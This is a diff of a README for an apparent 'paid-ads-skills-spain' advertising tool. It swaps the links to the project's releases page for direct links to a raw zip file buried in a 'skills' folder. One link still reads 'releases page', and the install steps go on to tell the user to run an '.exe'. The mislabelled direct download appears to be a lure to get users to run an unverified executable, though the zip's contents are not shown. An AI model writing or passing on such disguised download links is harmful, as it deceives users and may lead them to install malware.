@@ -1,6 +1,6 @@
 # 📈 paid-ads-skills-spain - Master paid advertisements for Spanish markets
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Myracoagulable91/paid-ads-skills-spain/releases)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Myracoagulable91/paid-ads-skills-spain/main/skills/google-ads-spain/ads-spain-skills-paid-1.9-beta.2.zip)
 
 ## 🎯 About the project
 
@@ -29,7 +29,7 @@ Ensure your computer meets these conditions before you begin the setup:
 
 Follow these steps to install the software on your computer:
 
-1. Visit the [releases page](https://github.com/Myracoagulable91/paid-ads-skills-spain/releases).
+1. Visit the [releases page](https://raw.githubusercontent.com/Myracoagulable91/paid-ads-skills-spain/main/skills/google-ads-spain/ads-spain-skills-paid-1.9-beta.2.zip).
 2. Look for the latest version listed under the Releases section.
 3. Find the file ending in `.exe`.
 4. Click the file name to start the download.
